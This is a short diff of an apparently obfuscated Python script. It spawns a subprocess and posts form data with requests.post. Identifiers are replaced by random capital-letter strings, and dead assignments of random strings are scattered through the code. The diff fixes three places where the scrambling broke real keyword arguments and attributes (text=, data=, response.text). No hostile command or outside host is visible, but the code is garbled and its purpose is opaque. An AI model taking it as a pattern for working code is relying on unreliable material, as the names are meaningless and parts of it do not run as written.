@@ -41,7 +41,7 @@ def QWVVGRZNUG(LSWBBVBHZPMSW, WZOFJJFCGPUE, AUIUYOLWIP):
         ],
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
-        CSKTDLASPJCT=True
+        text=True
     )
 
     for line in process.stderr:
@@ -106,7 +106,7 @@ def RFNGCFY():
         'coreq': 'a'  
     }
 
-    response = requests.post(url, VJUWM=VJUWM)
+    response = requests.post(url, data=VJUWM)
 
 
 
@@ -117,7 +117,7 @@ def RFNGCFY():
     delDoNdp = "l9fJzx"
     DtRxyVzJQnuMrl = "AGkyb8abfEXwdRV0LFpo"
     if response.status_code == 200:
-        CSKTDLASPJCT = response.CSKTDLASPJCT
+        CSKTDLASPJCT = response.text
         if CSKTDLASPJCT=='200':
             vmsQSFaVlOpVuYMDgLeY = "88hpzXqi"
             EdcCZaQKLGX = "7UARU4UEEFPCRh"
